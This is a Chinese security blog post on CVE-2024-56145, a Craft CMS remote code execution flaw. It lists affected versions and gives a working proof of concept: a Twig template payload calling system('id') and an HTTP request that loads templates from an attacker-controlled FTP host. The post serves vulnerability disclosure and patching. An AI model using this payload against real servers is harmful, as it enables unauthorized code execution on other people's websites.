#  CVE-2024-56145｜Craft CMS远程代码执行漏洞（POC）   
alicy  信安百科   2024-12-28 09:56  
  
**0x00 前言**  
  
## Craft CMS是一个开源的内容管理系统，它专注于用户友好的内容创建过程，可以用来创建个人或企业网站也可以搭建企业级电子商务系统。  
##   
## Craft界面简洁优雅，逻辑清晰明了，是一个高度自由，高度自定义设计的平台。虽然不需要专业的编程知识，要对模板语法有所了解才能很好的使用。  
##   
  
  
**0x01 漏洞描述**  
  
  
如果受影响版本的Craft CMS用户的php.ini配置文件中启用了"register_argc_argv"，**未授权攻击者可以利用漏洞执行任意代码。**  
  
  
  
**0x02 CVE编号**  
  
  
CVE-2024-56145  
  
  
  
**0x03 影响版本**  
  
```
5.0.0-RC1 ≤ Craft CMS < 5.5.2
4.0.0-RC1 ≤ Craft CMS < 4.13.2
3.0.0 ≤ Craft CMS < 3.9.14
```  
  
  
  
**0x04 漏洞详情**  
  
  
利用条件：  
  
1. 创建  
允许匿名访问的FTP服务器  
，写入default/index.twig使网站可以访问  
  
  
2. index.twig文件内容是：  
{{ [  
'system'  
,   
'id'  
] |   
sort  
(  
'call_user_func'  
) }}  
  
  
3. php.ini配置启用了“register_argc_argv”  
  
```
GET /?--templatesPath=ftp://a:a@xx.xx.xx:2121/ HTTP/1.1
Host: localhost:8000
...
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 19 Nov 2024 00:10:50 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
X-Powered-By: Craft CMS
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer-when-downgrade
Content-Length: 15

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6urv7A3NK92iafROqjwQfOPK7ic6P8zjRGBDdBr8EMJKUJfTKIeiabgjxQXl9d3BDwWCthicC9JJnKM9RQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
**0x05 参考链接**  
  
  
https://github.com/Chocapikk/CVE-2024-56145  
  
  
https://github.com/craftcms/cms/security/advisories/GHSA-2p6p-9rc9-62j9  
  
  
  
  
推荐阅读：  
  
  
[CVE-2023-41892｜Craft CMS远程代码执行漏洞](https://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247484581&idx=1&sn=6af6555cca6906a1dcacfe12c906da79&scene=21#wechat_redirect)  
  
  
  
[CVE-2024-11477｜7-Zip代码执行漏洞（POC）](https://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485713&idx=2&sn=6b514f8a63ef9950e23b2b6671d555c2&scene=21#wechat_redirect)  
  
  
  
[CVE-2024-37383｜Roundcube Webmail存储型XSS漏洞（POC）](https://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485685&idx=1&sn=838e54bc45cab050c38c37137d553fa1&scene=21#wechat_redirect)  
  
  
  
  
  
Ps：国内外安全热点分享，欢迎大家分享、转载，请保证文章的完整性。文章中出现敏感信息和侵权内容，请联系作者删除信息。信息安全任重道远，感谢您的支持  
![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6urTIficI8UhQibwpYWx4ic7Bk40AJlXrgx3icofWCbd5cbJFheld132R8exvlHnicn0AUjHLmVok4wV9qA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
！！！  
  
  
**本公众号的文章及工具仅提供学习参考，由于传播、利用此文档提供的信息而造成任何直接或间接的后果及损害，均由使用者本人负责,本公众号及文章作者不为此承担任何责任。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6uqQ24S6worK6npevNP8p1uPc9jQeMAib2iaibBnibOzFaIbD0KlvsEtUAmL3xdbJJnWk74Y1KfBcIazzw/640?wx_fmt=png "")  
  
  
